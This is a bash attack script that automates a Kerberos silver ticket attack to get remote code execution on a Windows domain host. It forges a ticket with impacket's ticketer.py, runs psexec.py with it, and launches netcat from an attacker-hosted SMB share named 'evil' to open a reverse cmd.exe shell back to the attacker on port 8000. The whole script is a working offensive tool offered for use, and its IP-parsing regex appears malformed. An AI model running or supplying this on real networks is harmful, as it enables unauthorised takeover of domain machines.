#!/bin/bash

######################################################################################################################################
##################################################### Silver Ticket To RCE ###########################################################
######################################################################################################################################
###### Author:      Iván Solís													######
######																######
###### Description: This script automatises all the necessary steps to get a NetCat being executed in the target machine,       ######  
######              creating a reverse shell to our machine.									######
######																######
######################################################################################################################################
######################################################################################################################################

NTHASH="" # Workstation's Account NTLM Hash
DOMAIN_SID="" # SID of the target Domain
USER="" # A existing username
HOST="" # It can be the FQDN or the Workstation IP
DOMAIN="" # Domain name

VERBOSE=false

if [ $UID -ne 0 ]; then
  echo "[-] It should be executed as root"
  exit 1
fi

if [ ! -z "$1" ]; then
  if [ "$1" == "-v" ]; then
    VERBOSE=true
  elif [ "$1" == "-h" ]; then
    echo "./SilverToRCE.sh [-h|-v]"
    echo "-h to show this usage message"
    echo "-v to run in verbose mode"
    exit 0
  fi
fi




echo "[+] Launching the SMB Server"
if [ "$VERBOSE" = true ];then
  echo "[VERBOSE] Showing the SMB output"	
  impacket-smbserver -smb2support evil . &
else
  impacket-smbserver -smb2support evil . 1>/dev/null &
fi

server_pid=$!
ip=$(ifconfig tun0 | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[0-9]{1,3}\.[0-9]{1,3}' | grep -m 1 10.)

if [ "$VERBOSE" = true ]; then
  echo "[VERBOSE] The 'server_pid' is "$server_pid
  echo "[VERBOSE] The 'ip' value is "$ip
fi

echo "[+] Creating the 'Silver Ticket'"
if [ "$VERBOSE" = true ]; then
  echo "[VERBOSE] Showing the Ticketer output"
  python3 /opt/impacket/examples/ticketer.py -nthash $NTHASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$HOST $USER 
else
  python3 /opt/impacket/examples/ticketer.py -nthash $NTHASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/$HOST $USER 1>/dev/null &
fi 
  
export KRB5CCNAME=$(pwd)/$USER.ccache 1>/dev/null

if [ "$VERBOSE" = true ]; then
  echo "[VERBOSE] The 'KRB4CCNAME' is equal to: "$(echo $KRB5CCNAME)
fi

echo "[+] Executing the command using the TGS"
if [ "$VERBOSE" = true ]; then
  echo "[VERBOSE] Showing the Psexec output"
  python3 /opt/impacket/examples/psexec.py -no-pass -k $DOMAIN/$USER@$HOST "\\\\${ip}\\evil\\nc.exe -e cmd.exe ${ip} 8000" &
else
  python3 /opt/impacket/examples/psexec.py -no-pass -k $DOMAIN/$USER@$HOST "\\\\${ip}\\evil\\nc.exe -e cmd.exe ${ip} 8000" 1>/dev/null &
fi

echo "[+] Listening for connections"
nc -lp 8000

echo "[*] Killing the SMB Server"
kill $server_pid
